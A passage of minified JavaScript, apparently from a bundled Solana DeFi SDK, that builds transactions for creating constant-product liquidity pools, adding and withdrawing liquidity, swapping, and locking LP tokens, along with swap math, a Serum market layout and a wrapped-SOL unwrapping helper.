            decimals: e.mintDecimalB,
            programId: e.mintProgramB.toBase58(),
            extensions: {
              feeConfig: n[e.mintB.toBase58()].feeConfig
                ? cE(n[e.mintB.toBase58()].feeConfig)
                : void 0,
            },
          }),
          i = uE({
            address: e.mintLp.toBase58(),
            decimals: e.lpDecimals,
            programId: _c.toBase58(),
          }),
          s = {
            id: e.configId.toBase58(),
            index: e.configInfo.index,
            protocolFeeRate: e.configInfo.protocolFeeRate.toNumber(),
            tradeFeeRate: e.configInfo.tradeFeeRate.toNumber(),
            fundFeeRate: e.configInfo.fundFeeRate.toNumber(),
            createPoolFee: e.configInfo.createPoolFee.toString(),
          },
          a = {
            volume: 0,
            volumeQuote: 0,
            volumeFee: 0,
            apr: 0,
            feeApr: 0,
            priceMin: 0,
            priceMax: 0,
            rewardApr: [],
          };
        return {
          poolInfo: {
            programId: e.programId.toBase58(),
            id: t,
            type: "Standard",
            lpMint: i,
            lpPrice: 0,
            lpAmount: e.lpAmount.toNumber(),
            config: s,
            mintA: r,
            mintB: o,
            rewardDefaultInfos: [],
            rewardDefaultPoolInfos: "Ecosystem",
            price: e.poolPrice.toNumber(),
            mintAmountA: new mI(e.vaultAAmount.toString())
              .div(10 ** r.decimals)
              .toNumber(),
            mintAmountB: new mI(e.vaultBAmount.toString())
              .div(10 ** o.decimals)
              .toNumber(),
            feeRate: e.configInfo.tradeFeeRate.toNumber(),
            openTime: e.openTime.toString(),
            tvl: 0,
            burnPercent: 0,
            day: a,
            week: a,
            month: a,
            pooltype: [],
            farmUpcomingCount: 0,
            farmOngoingCount: 0,
            farmFinishedCount: 0,
          },
          poolKeys: {
            programId: e.programId.toBase58(),
            id: t,
            mintA: r,
            mintB: o,
            openTime: e.openTime.toString(),
            vault: { A: e.vaultA.toBase58(), B: e.vaultB.toBase58() },
            authority: sx(e.programId).publicKey.toBase58(),
            mintLp: i,
            config: s,
            observationId: cx(e.programId, new Xi(t)).publicKey.toBase58(),
          },
          rpcData: e,
        };
      }
      async createPool(t) {
        var e,
          n,
          r,
          o = t,
          {
            poolId: i,
            programId: s,
            poolFeeAccount: a,
            startTime: u,
            ownerInfo: c,
            associatedOnly: l = !1,
            checkCreateATAOwner: d = !1,
            txVersion: f,
            feeConfig: h,
            computeBudgetConfig: p,
            txTipConfig: m,
            feePayer: g,
          } = o,
          y = kA(o, [
            "poolId",
            "programId",
            "poolFeeAccount",
            "startTime",
            "ownerInfo",
            "associatedOnly",
            "checkCreateATAOwner",
            "txVersion",
            "feeConfig",
            "computeBudgetConfig",
            "txTipConfig",
            "feePayer",
          ]);
        let w =
            c.feePayer ||
            (null == (e = this.scope.owner) ? void 0 : e.publicKey),
          b = new Zn(new Xi(y.mintA.address).toBuffer()).lte(
            new Zn(new Xi(y.mintB.address).toBuffer())
          ),
          [v, A] = b ? [y.mintA, y.mintB] : [y.mintB, y.mintA],
          [k, I] = b
            ? [y.mintAAmount, y.mintBAmount]
            : [y.mintBAmount, y.mintAAmount],
          S = c.useSOLBalance && v.address === Bc.toBase58(),
          _ = c.useSOLBalance && A.address === Bc.toBase58(),
          [T, C] = [new Xi(v.address), new Xi(A.address)],
          B = this.createTxBuilder(g),
          { account: E, instructionParams: x } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: T,
              tokenProgram: v.programId,
              owner: this.scope.ownerPubKey,
              createInfo: S ? { payer: w, amount: k } : void 0,
              notUseTokenAccount: S,
              skipCloseAccount: !S,
              associatedOnly: !S && l,
              checkCreateATAOwner: d,
            });
        B.addInstruction(x || {});
        let { account: P, instructionParams: R } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: new Xi(A.address),
            tokenProgram: A.programId,
            owner: this.scope.ownerPubKey,
            createInfo: _ ? { payer: w, amount: I } : void 0,
            notUseTokenAccount: _,
            skipCloseAccount: !_,
            associatedOnly: !_ && l,
            checkCreateATAOwner: d,
          });
        if ((B.addInstruction(R || {}), void 0 === E || void 0 === P))
          throw Error("you don't has some token account");
        let O = lx({
          poolId: i,
          programId: s,
          configId: new Xi(h.id),
          mintA: T,
          mintB: C,
        });
        return (
          B.addInstruction({
            instructions: [
              mx(
                s,
                this.scope.ownerPubKey,
                new Xi(h.id),
                O.authority,
                O.poolId,
                T,
                C,
                O.lpMint,
                E,
                P,
                h_(this.scope.ownerPubKey, O.lpMint).publicKey,
                O.vaultA,
                O.vaultB,
                a,
                new Xi(null != (n = v.programId) ? n : _c),
                new Xi(null != (r = A.programId) ? r : _c),
                O.observationId,
                k,
                I,
                u
              ),
            ],
            instructionTypes: [ZS],
          }),
          B.addCustomComputeBudget(p),
          B.addTipInstruction(m),
          B.versionBuild({
            txVersion: f,
            extInfo: {
              address: AA(vA({}, O), {
                mintA: v,
                mintB: A,
                programId: s,
                poolFeeAccount: a,
                feeConfig: h,
              }),
            },
          })
        );
      }
      async addLiquidity(t) {
        let {
          poolInfo: e,
          poolKeys: n,
          inputAmount: r,
          baseIn: o,
          slippage: i,
          computeResult: s,
          computeBudgetConfig: a,
          txTipConfig: u,
          config: c,
          txVersion: l,
          feePayer: d,
        } = t;
        !1 === this.scope.availability.addStandardPosition &&
          this.logAndCreateError(
            "add liquidity feature disabled in your region"
          ),
          r.isZero() &&
            this.logAndCreateError(
              "amounts must greater than zero",
              "amountInA",
              { amountInA: r.toString() }
            );
        let { account: f } = this.scope,
          { bypassAssociatedCheck: h, checkCreateATAOwner: p } = vA(
            { bypassAssociatedCheck: !1, checkCreateATAOwner: !1 },
            c
          ),
          m = s ? void 0 : await this.getRpcPoolInfo(e.id),
          {
            liquidity: g,
            inputAmountFee: y,
            anotherAmount: w,
          } = s ||
          this.computePairAmount({
            poolInfo: AA(vA({}, e), {
              lpAmount: new mI(m.lpAmount.toString())
                .div(10 ** e.lpMint.decimals)
                .toNumber(),
            }),
            baseReserve: m.baseReserve,
            quoteReserve: m.quoteReserve,
            slippage: new XI(0),
            baseIn: o,
            epochInfo: await this.scope.fetchEpochInfo(),
            amount: new mI(r.toString()).div(
              10 ** (o ? e.mintA.decimals : e.mintB.decimals)
            ),
          }),
          b = w.amount,
          v = e.mintA.address === Bc.toString(),
          A = e.mintB.address === Bc.toString(),
          k = this.createTxBuilder(d),
          [I, S] = [new Xi(e.mintA.address), new Xi(e.mintB.address)],
          { account: _, instructionParams: T } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: e.mintA.programId,
              mint: new Xi(e.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo:
                v || (o ? r : b).isZero()
                  ? { payer: this.scope.ownerPubKey, amount: o ? r : b }
                  : void 0,
              skipCloseAccount: !v,
              notUseTokenAccount: v,
              associatedOnly: !1,
              checkCreateATAOwner: p,
            });
        k.addInstruction(T || {});
        let { account: C, instructionParams: B } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: e.mintB.programId,
            mint: new Xi(e.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              A || (o ? b : r).isZero()
                ? { payer: this.scope.ownerPubKey, amount: o ? b : r }
                : void 0,
            skipCloseAccount: !A,
            notUseTokenAccount: A,
            associatedOnly: !1,
            checkCreateATAOwner: p,
          });
        k.addInstruction(B || {}),
          !_ &&
            !C &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              f.tokenAccounts
            );
        let E = await f.getCreatedTokenAccount({
            mint: new Xi(e.lpMint.address),
          }),
          x = await f.handleTokenAccount({
            side: "out",
            amount: 0,
            mint: new Xi(e.lpMint.address),
            tokenAccount: E,
            bypassAssociatedCheck: h,
            checkCreateATAOwner: p,
          }),
          { tokenAccount: P } = x,
          R = kA(x, ["tokenAccount"]);
        k.addInstruction(R);
        let O = null != n ? n : await this.getCpmmPoolKeys(e.id),
          M = new XI(new Zn(1)).sub(i);
        return (
          k.addInstruction({
            instructions: [
              gx(
                new Xi(e.programId),
                this.scope.ownerPubKey,
                new Xi(O.authority),
                new Xi(e.id),
                P,
                _,
                C,
                new Xi(O.vault.A),
                new Xi(O.vault.B),
                I,
                S,
                new Xi(e.lpMint.address),
                s ? (null == s ? void 0 : s.liquidity) : M.mul(g).quotient,
                o ? y.amount : b,
                o ? b : y.amount
              ),
            ],
            instructionTypes: [JS],
            lookupTableAddress: O.lookupTableAccount
              ? [O.lookupTableAccount]
              : [],
          }),
          k.addCustomComputeBudget(a),
          k.addTipInstruction(u),
          k.versionBuild({ txVersion: l })
        );
      }
      async withdrawLiquidity(t) {
        var e, n;
        let {
          poolInfo: r,
          poolKeys: o,
          lpAmount: i,
          slippage: s,
          computeBudgetConfig: a,
          txTipConfig: u,
          txVersion: c,
          feePayer: l,
          closeWsol: d = !0,
        } = t;
        !1 === this.scope.availability.addStandardPosition &&
          this.logAndCreateError(
            "add liquidity feature disabled in your region"
          );
        let f,
          h,
          p = new XI(new Zn(1)).sub(s),
          m = await this.getRpcPoolInfo(r.id),
          [g, y] = [
            p.mul(i.mul(m.baseReserve).div(m.lpAmount)).quotient,
            p.mul(i.mul(m.quoteReserve).div(m.lpAmount)).quotient,
          ],
          w = await this.scope.fetchEpochInfo(),
          [b, v] = [
            D_(g, r.mintA.extensions.feeConfig, w, !1),
            D_(y, r.mintB.extensions.feeConfig, w, !1),
          ],
          { account: A } = this.scope,
          k = this.createTxBuilder(l),
          [I, S] = [new Xi(r.mintA.address), new Xi(r.mintB.address)],
          _ = I.equals(zI),
          T = S.equals(zI),
          { account: C, instructionParams: B } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: r.mintA.programId,
              mint: new Xi(r.mintA.address),
              notUseTokenAccount: _,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !(_ && d),
              associatedOnly: !_,
              checkCreateATAOwner: !1,
            });
        (f = C), B && k.addInstruction(B);
        let { account: E, instructionParams: x } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: r.mintB.programId,
            mint: new Xi(r.mintB.address),
            notUseTokenAccount: T,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !(T && d),
            associatedOnly: !T,
            checkCreateATAOwner: !1,
          });
        (h = E),
          x && k.addInstruction(x),
          (!f || !h) &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              A.tokenAccounts
            );
        let P = await A.getCreatedTokenAccount({
          mint: new Xi(r.lpMint.address),
        });
        P ||
          this.logAndCreateError(
            "cannot found lp token account",
            "tokenAccounts",
            A.tokenAccounts
          );
        let R = null != o ? o : await this.getCpmmPoolKeys(r.id);
        return (
          k.addInstruction({
            instructions: [
              yx(
                new Xi(r.programId),
                this.scope.ownerPubKey,
                new Xi(R.authority),
                new Xi(r.id),
                P,
                f,
                h,
                new Xi(R.vault.A),
                new Xi(R.vault.B),
                I,
                S,
                new Xi(r.lpMint.address),
                i,
                g.sub(null != (e = b.fee) ? e : new Zn(0)),
                y.sub(null != (n = v.fee) ? n : new Zn(0))
              ),
            ],
            instructionTypes: [YS],
            lookupTableAddress: R.lookupTableAccount
              ? [R.lookupTableAccount]
              : [],
          }),
          k.addCustomComputeBudget(a),
          k.addTipInstruction(u),
          k.versionBuild({ txVersion: c })
        );
      }
      async swap(t) {
        var e, n, r, o, i, s;
        let {
            poolInfo: a,
            poolKeys: u,
            baseIn: c,
            fixedOut: l,
            inputAmount: d,
            swapResult: f,
            slippage: h = 0,
            config: p,
            computeBudgetConfig: m,
            txTipConfig: g,
            txVersion: y,
            feePayer: w,
          } = t,
          {
            bypassAssociatedCheck: b,
            checkCreateATAOwner: v,
            associatedOnly: A,
          } = vA(
            {
              bypassAssociatedCheck: !1,
              checkCreateATAOwner: !1,
              associatedOnly: !0,
            },
            p
          ),
          k = this.createTxBuilder(w),
          [I, S] = [new Xi(a.mintA.address), new Xi(a.mintB.address)];
        l
          ? (f.sourceAmountSwapped = f.sourceAmountSwapped
              .mul(new Zn(1e4 * (1 + h)))
              .div(new Zn(1e4)))
          : (f.destinationAmountSwapped = f.destinationAmountSwapped
              .mul(new Zn(1e4 * (1 - h)))
              .div(new Zn(1e4)));
        let _ = a.mintA.address === zI.toBase58(),
          T = a.mintB.address === zI.toBase58(),
          { account: C, instructionParams: B } =
            await this.scope.account.getOrCreateTokenAccount({
              mint: I,
              tokenProgram: new Xi(null != (e = a.mintA.programId) ? e : _c),
              owner: this.scope.ownerPubKey,
              createInfo:
                _ || !c
                  ? {
                      payer: this.scope.ownerPubKey,
                      amount: c ? f.sourceAmountSwapped : 0,
                    }
                  : void 0,
              notUseTokenAccount: _,
              skipCloseAccount: !_,
              associatedOnly: !_ && A,
              checkCreateATAOwner: v,
            });
        B && k.addInstruction(B);
        let { account: E, instructionParams: x } =
          await this.scope.account.getOrCreateTokenAccount({
            mint: S,
            tokenProgram: new Xi(null != (n = a.mintB.programId) ? n : _c),
            owner: this.scope.ownerPubKey,
            createInfo:
              T || c
                ? {
                    payer: this.scope.ownerPubKey,
                    amount: c ? 0 : f.sourceAmountSwapped,
                  }
                : void 0,
            notUseTokenAccount: T,
            skipCloseAccount: !T,
            associatedOnly: !T && A,
            checkCreateATAOwner: v,
          });
        x && k.addInstruction(x),
          (!C || !E) &&
            this.logAndCreateError("user do not have token account", {
              mintA: a.mintA.symbol || a.mintA.address,
              mintB: a.mintB.symbol || a.mintB.address,
              mintATokenAcc: C,
              mintBTokenAcc: E,
              mintAUseSOLBalance: _,
              mintBUseSOLBalance: T,
              associatedOnly: A,
            });
        let P = null != u ? u : await this.getCpmmPoolKeys(a.id);
        return (
          k.addInstruction({
            instructions: [
              l
                ? bx(
                    new Xi(a.programId),
                    this.scope.ownerPubKey,
                    new Xi(P.authority),
                    new Xi(P.config.id),
                    new Xi(a.id),
                    c ? C : E,
                    c ? E : C,
                    new Xi(P.vault[c ? "A" : "B"]),
                    new Xi(P.vault[c ? "B" : "A"]),
                    new Xi(
                      null != (i = a[c ? "mintA" : "mintB"].programId) ? i : _c
                    ),
                    new Xi(
                      null != (s = a[c ? "mintB" : "mintA"].programId) ? s : _c
                    ),
                    c ? I : S,
                    c ? S : I,
                    cx(new Xi(a.programId), new Xi(a.id)).publicKey,
                    f.sourceAmountSwapped,
                    f.destinationAmountSwapped
                  )
                : wx(
                    new Xi(a.programId),
                    this.scope.ownerPubKey,
                    new Xi(P.authority),
                    new Xi(P.config.id),
                    new Xi(a.id),
                    c ? C : E,
                    c ? E : C,
                    new Xi(P.vault[c ? "A" : "B"]),
                    new Xi(P.vault[c ? "B" : "A"]),
                    new Xi(
                      null != (r = a[c ? "mintA" : "mintB"].programId) ? r : _c
                    ),
                    new Xi(
                      null != (o = a[c ? "mintB" : "mintA"].programId) ? o : _c
                    ),
                    c ? I : S,
                    c ? S : I,
                    cx(new Xi(a.programId), new Xi(a.id)).publicKey,
                    d,
                    f.destinationAmountSwapped
                  ),
            ],
            instructionTypes: [l ? $S : kS],
          }),
          k.addCustomComputeBudget(m),
          k.addTipInstruction(g),
          k.versionBuild({ txVersion: y })
        );
      }
      async lockLp(t) {
        var e, n, r, o, i;
        let {
          poolInfo: s,
          lpAmount: a,
          computeBudgetConfig: u,
          txTipConfig: c,
          txVersion: l,
          feePayer: d,
          feeNftOwner: f,
        } = t;
        a.isZero() &&
          this.logAndCreateError("lpAmount must greater than zero", {
            lpAmount: a.toString(),
          });
        let h = this.createTxBuilder(d),
          p = null != (e = t.poolKeys) ? e : await this.getCpmmPoolKeys(s.id),
          m = await vx({
            poolInfo: s,
            poolKeys: p,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              feePayer: null != (n = t.feePayer) ? n : this.scope.ownerPubKey,
            },
            feeNftOwner: null != f ? f : this.scope.ownerPubKey,
            lockProgram: null != (r = t.programId) ? r : R_,
            lockAuthProgram: null != (o = t.authProgram) ? o : O_,
            lpAmount: a,
            withMetadata: null == (i = t.withMetadata) || i,
            getEphemeralSigners: t.getEphemeralSigners,
          });
        return (
          h.addInstruction(m),
          h.addCustomComputeBudget(u),
          h.addTipInstruction(c),
          h.versionBuild({ txVersion: l, extInfo: m.address })
        );
      }
      async harvestLockLp(t) {
        var e;
        let {
          poolInfo: n,
          lpFeeAmount: r,
          nftMint: o,
          programId: i = R_,
          authProgram: s = O_,
          cpmmProgram: a,
          computeBudgetConfig: u,
          txTipConfig: c,
          txVersion: l,
          closeWsol: d = !0,
        } = t;
        r.isZero() &&
          this.logAndCreateError("lpFeeAmount must greater than zero", {
            lpAmount: r.toString(),
          });
        let f,
          h,
          p = t.feePayer || this.scope.ownerPubKey,
          m = this.createTxBuilder(p),
          [g, y] = [new Xi(n.mintA.address), new Xi(n.mintB.address)],
          w = g.equals(zI),
          b = y.equals(zI),
          { account: v, instructionParams: A } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: n.mintA.programId,
              mint: new Xi(n.mintA.address),
              notUseTokenAccount: w,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !(w && d),
              associatedOnly: !w,
              checkCreateATAOwner: !1,
            });
        (f = v), A && m.addInstruction(A);
        let { account: k, instructionParams: I } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: n.mintB.programId,
            mint: new Xi(n.mintB.address),
            notUseTokenAccount: b,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !(b && d),
            associatedOnly: !b,
            checkCreateATAOwner: !1,
          });
        (h = k),
          I && m.addInstruction(I),
          (!f || !h) &&
            this.logAndCreateError("cannot found target token accounts", {
              tokenAccountA: f,
              tokenAccountB: h,
            });
        let S = null != (e = t.poolKeys) ? e : await this.getCpmmPoolKeys(n.id),
          { publicKey: _ } = h_(p, o, _c),
          { publicKey: T } = fx(i, o),
          { publicKey: C } = h_(s, new Xi(n.lpMint.address), _c);
        return (
          m.addInstruction({
            instructions: [
              Ax({
                programId: null != i ? i : R_,
                nftOwner: this.scope.ownerPubKey,
                auth: null != s ? s : O_,
                nftAccount: _,
                lockPda: T,
                poolId: new Xi(n.id),
                mintLp: new Xi(S.mintLp.address),
                userVaultA: f,
                userVaultB: h,
                poolVaultA: new Xi(S.vault.A),
                poolVaultB: new Xi(S.vault.B),
                mintA: g,
                mintB: y,
                lockLpVault: C,
                lpFeeAmount: r,
                cpmmProgram: null == a ? void 0 : a.programId,
                cpmmAuthProgram: null == a ? void 0 : a.authProgram,
              }),
            ],
            instructionTypes: [e_],
          }),
          m.addCustomComputeBudget(u),
          m.addTipInstruction(c),
          m.versionBuild({ txVersion: l })
        );
      }
      computeSwapAmount({ pool: t, amountIn: e, outputMint: n, slippage: r }) {
        let o = n.toString() === t.mintB.address,
          i = tx.swap(
            e,
            o ? t.baseReserve : t.quoteReserve,
            o ? t.quoteReserve : t.baseReserve,
            t.configInfo.tradeFeeRate
          ),
          s = new mI(i.destinationAmountSwapped.toString()).div(
            i.sourceAmountSwapped.toString()
          ),
          a = i.destinationAmountSwapped
            .mul(new Zn(1e4 * (1 - r)))
            .div(new Zn(1e4));
        return {
          allTrade: i.sourceAmountSwapped.eq(e),
          amountIn: e,
          amountOut: i.destinationAmountSwapped,
          minAmountOut: a,
          executionPrice: s,
          fee: i.tradeFee,
          priceImpact: t.poolPrice.sub(s).div(t.poolPrice),
        };
      }
      computePairAmount({
        poolInfo: t,
        baseReserve: e,
        quoteReserve: n,
        amount: r,
        slippage: o,
        epochInfo: i,
        baseIn: s,
      }) {
        var a, u, c, l, d, f, h, p, m;
        let g = 1 - Number(o.toSignificant()) / 100,
          y = new Zn(
            new mI(r)
              .mul(10 ** t[s ? "mintA" : "mintB"].decimals)
              .mul(g)
              .toFixed(0)
          ),
          w = D_(y, t[s ? "mintA" : "mintB"].extensions.feeConfig, i, !1),
          b = y.sub(null != (a = w.fee) ? a : new Zn(0)),
          v = new Zn(
            new mI(t.lpAmount)
              .mul(10 ** t.lpMint.decimals)
              .toFixed(0, mI.ROUND_DOWN)
          );
        this.logDebug(
          "baseReserve:",
          e.toString(),
          "quoteReserve:",
          n.toString()
        ),
          this.logDebug(
            "tokenIn:",
            s ? t.mintA.symbol : t.mintB.symbol,
            "amountIn:",
            y.toString(),
            "amountInFee:",
            null != (c = null == (u = w.fee) ? void 0 : u.toString()) ? c : 0,
            "anotherToken:",
            s ? t.mintB.symbol : t.mintA.symbol,
            "slippage:",
            `${o.toSignificant()}%`
          );
        let A = s ? "base" : "quote";
        this.logDebug("input side:", A);
        let k = b.mul(v).div("base" === A ? e : n),
          I = { amount: QI, fee: void 0, expirationTime: void 0 };
        if (!b.isZero()) {
          let r = (function (t, e, n, r) {
            let o = t.mul(e).div(r);
            !o.isZero() && !t.mul(e).mod(r).isZero() && (o = o.add(new Zn(1)));
            let i = t.mul(n).div(r);
            return (
              !i.isZero() &&
                !t.mul(n).mod(r).isZero() &&
                (i = i.add(new Zn(1))),
              { amountA: o, amountB: i }
            );
          })(k, e, n, v);
          this.logDebug("lpAmountData:", {
            amountA: r.amountA.toString(),
            amountB: r.amountB.toString(),
          }),
            (I = D_(
              r[s ? "amountB" : "amountA"],
              t[s ? "mintB" : "mintA"].extensions.feeConfig,
              i,
              !0
            ));
        }
        let S = new XI(new Zn(1)).add(o),
          _ = new XI(new Zn(1)).sub(o),
          T = D_(
            S.mul(I.amount.sub(null != (l = I.fee) ? l : new Zn(0))).quotient,
            t[s ? "mintB" : "mintA"].extensions.feeConfig,
            i,
            !0
          ),
          C = D_(
            _.mul(I.amount.sub(null != (d = I.fee) ? d : new Zn(0))).quotient,
            t[s ? "mintB" : "mintA"].extensions.feeConfig,
            i,
            !0
          );
        return (
          this.logDebug(
            "anotherAmount:",
            I.amount.toString(),
            "anotherAmountFee:",
            null != (h = null == (f = I.fee) ? void 0 : f.toString()) ? h : 0,
            "maxAnotherAmount:",
            T.amount.toString(),
            "maxAnotherAmountFee:",
            null != (m = null == (p = T.fee) ? void 0 : p.toString()) ? m : 0
          ),
          {
            inputAmountFee: w,
            anotherAmount: I,
            maxAnotherAmount: T,
            minAnotherAmount: C,
            liquidity: k,
          }
        );
      }
    };
  var _x = { [b_.toBase58()]: 3 },
    Tx = { 3: b_ },
    Cx = VT([
      ET(5),
      ET(8),
      WT("ownAddress"),
      NT("vaultSignerNonce"),
      WT("baseMint"),
      WT("quoteMint"),
      WT("baseVault"),
      NT("baseDepositsTotal"),
      NT("baseFeesAccrued"),
      WT("quoteVault"),
      NT("quoteDepositsTotal"),
      NT("quoteFeesAccrued"),
      NT("quoteDustThreshold"),
      WT("requestQueue"),
      WT("eventQueue"),
      WT("bids"),
      WT("asks"),
      NT("baseLotSize"),
      NT("quoteLotSize"),
      NT("feeRateBps"),
      NT("referrerRebatesAccrued"),
      ET(7),
    ]),
    Bx = { 3: Cx },
    Ex = CA("Serum"),
    xx = class {
      static getProgramId(t) {
        let e = Tx[t];
        return e || Ex.logWithError("invalid version", "version", t), e;
      }
      static getVersion(t) {
        let e = t.toBase58(),
          n = _x[e];
        return n || Ex.logWithError("invalid program id", "programId", e), n;
      }
      static getStateLayout(t) {
        let e = Bx[t];
        return e || Ex.logWithError(!!e, "invalid version", "version", t), e;
      }
      static getLayouts(t) {
        return { state: this.getStateLayout(t) };
      }
      static getAssociatedAuthority({ programId: t, marketId: e }) {
        let n,
          r = [e.toBuffer()],
          o = 0;
        for (; o < 100; ) {
          try {
            let e = r.concat(ct.from([o]), ct.alloc(7));
            n = Xi.createProgramAddressSync(e, t);
          } catch (K_) {
            if (K_ instanceof TypeError) throw K_;
            o++;
            continue;
          }
          return { publicKey: n, nonce: o };
        }
        return (
          Ex.logWithError(
            "unable to find a viable program address nonce",
            "params",
            { programId: t, marketId: e }
          ),
          { publicKey: Xi.default, nonce: o }
        );
      }
    };
  function Px(t, e, n, r, o, i, s, a, u, c, l, d, f, h, p) {
    var m;
    let g = [],
      y = [
        PI({ pubkey: _c, isWritable: !1 }),
        PI({ pubkey: Tc, isWritable: !1 }),
        PI({ pubkey: Cc, isWritable: !1 }),
        PI({ pubkey: Fs.programId, isWritable: !1 }),
        PI({ pubkey: e, isSigner: !0 }),
      ];
    y.push(PI({ pubkey: n })), y.push(PI({ pubkey: o }));
    let w = [u, c],
      b = [l, d],
      v = [i, s, a];
    for (let I = 0; I < w.length; I++) {
      let t = w[I],
        e = v[I] === t.mintA.address;
      if (
        (y.push(PI({ pubkey: new Xi(t.programId), isWritable: !1 })),
        I === w.length - 1
          ? y.push(PI({ pubkey: o }))
          : y.push(PI({ pubkey: r })),
        y.push(PI({ pubkey: new Xi(v[I]) })),
        y.push(PI({ pubkey: new Xi(v[I + 1]) })),
        6 === t.version)
      ) {
        let n = b[I];
        y.push(PI({ pubkey: new Xi(n.config.id) })),
          y.push(PI({ pubkey: new Xi(n.id) })),
          y.push(PI({ pubkey: new Xi(e ? n.vault.A : n.vault.B) })),
          y.push(PI({ pubkey: new Xi(e ? n.vault.B : n.vault.A) })),
          y.push(PI({ pubkey: new Xi(t.observationId) })),
          y.push(PI({ pubkey: NI })),
          y.push(
            PI({ pubkey: kB(new Xi(t.programId), new Xi(t.id)).publicKey })
          ),
          g.push(Rx(t.sqrtPriceX64.toString(), e));
        for (let t of null != (m = p[I]) ? m : [])
          y.push(PI({ pubkey: new Xi(t) }));
      } else if (5 === t.version) {
        let t = b[I];
        y.push(PI({ pubkey: new Xi(t.id) })),
          y.push(PI({ pubkey: new Xi(t.authority), isWritable: !1 })),
          y.push(PI({ pubkey: new Xi(t.marketProgramId) })),
          y.push(PI({ pubkey: new Xi(t.marketAuthority) })),
          y.push(PI({ pubkey: A_, isWritable: !1 })),
          y.push(PI({ pubkey: new Xi(t.openOrders) })),
          y.push(PI({ pubkey: new Xi(t.vault.A) })),
          y.push(PI({ pubkey: new Xi(t.vault.B) })),
          y.push(PI({ pubkey: new Xi(t.id) })),
          y.push(PI({ pubkey: new Xi(t.id) })),
          y.push(PI({ pubkey: new Xi(t.id) })),
          y.push(PI({ pubkey: new Xi(t.id) })),
          y.push(PI({ pubkey: new Xi(t.id) })),
          y.push(PI({ pubkey: new Xi(t.id) })),
          y.push(PI({ pubkey: new Xi(t.marketId) })),
          y.push(PI({ pubkey: new Xi(t.marketBids) })),
          y.push(PI({ pubkey: new Xi(t.marketAsks) })),
          y.push(PI({ pubkey: new Xi(t.marketEventQueue) })),
          y.push(PI({ pubkey: new Xi(t.marketBaseVault) })),
          y.push(PI({ pubkey: new Xi(t.marketQuoteVault) }));
      } else if (4 === t.version) {
        let e = b[I],
          n = 1 !== t.status;
        y.push(PI({ pubkey: new Xi(e.id) })),
          y.push(PI({ pubkey: new Xi(e.authority), isWritable: !1 })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketProgramId) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketAuthority) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.openOrders) })),
          y.push(PI({ pubkey: new Xi(e.vault.A) })),
          y.push(PI({ pubkey: new Xi(e.vault.B) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketId) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketBids) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketAsks) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketEventQueue) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketBaseVault) })),
          y.push(PI({ pubkey: new Xi(n ? e.id : e.marketQuoteVault) }));
      } else {
        if (7 !== t.version) throw Error("pool type error");
        {
          let n = b[I];
          y.push(PI({ pubkey: new Xi(n.authority) })),
            y.push(PI({ pubkey: new Xi(n.config.id) })),
            y.push(PI({ pubkey: new Xi(n.id) })),
            y.push(PI({ pubkey: new Xi(e ? n.vault.A : n.vault.B) })),
            y.push(PI({ pubkey: new Xi(e ? n.vault.B : n.vault.A) })),
            y.push(PI({ pubkey: new Xi(t.observationId) }));
        }
      }
    }
    let A = VT([
        MT("insId"),
        NT("amountIn"),
        NT("amountOut"),
        HT(DT(), g.length, "clmmPriceLimit"),
      ]),
      k = ct.alloc(A.span);
    return (
      A.encode({ insId: 0, amountIn: f, amountOut: h, clmmPriceLimit: g }, k),
      new ws({ keys: y, programId: t, data: k })
    );
  }
  function Rx(t, e) {
    if (t) {
      if (e) {
        let e = new Zn(t).div(new Zn(25));
        return e.gt(QC) ? e : QC;
      }
      {
        let e = new Zn(t).mul(new Zn(25));
        return e.lt($C) ? e : $C;
      }
    }
    return e ? QC : $C;
  }
  var Ox = new Zn(0),
    Mx = class extends iT {
      constructor(t) {
        super(t);
      }
      async getWSolAccounts() {
        this.scope.checkOwner(),
          await this.scope.account.fetchWalletTokenAccounts();
        let t = this.scope.account.tokenAccounts.filter((t) =>
          t.mint.equals(zI)
        );
        return (
          t.sort((t, e) =>
            t.isAssociated
              ? 1
              : e.isAssociated || t.amount.lt(e.amount)
              ? -1
              : 1
          ),
          t
        );
      }
      async unWrapWSol(t) {
        let { amount: e, tokenProgram: n, txVersion: r = 1, feePayer: o } = t,
          i = await this.getWSolAccounts(),
          s = this.createTxBuilder(o);
        s.addCustomComputeBudget(t.computeBudgetConfig);
        let a = bI(e);
        for (let u = 0; u < i.length; u++)
          a.gte(i[u].amount)
            ? (s.addInstruction({
                instructions: [
                  QT({
                    tokenAccount: i[u].publicKey,
                    payer: this.scope.ownerPubKey,
                    owner: this.scope.ownerPubKey,
                    programId: n,
                  }),
                ],
              }),
              a.sub(i[u].amount))
            : s.addInstruction({
                instructions: [
                  QT({
                    tokenAccount: i[u].publicKey,
                    payer: this.scope.ownerPubKey,
                    owner: this.scope.ownerPubKey,
                    programId: n,
                  }),
                ],
              });
        return s.versionBuild({ txVersion: r });
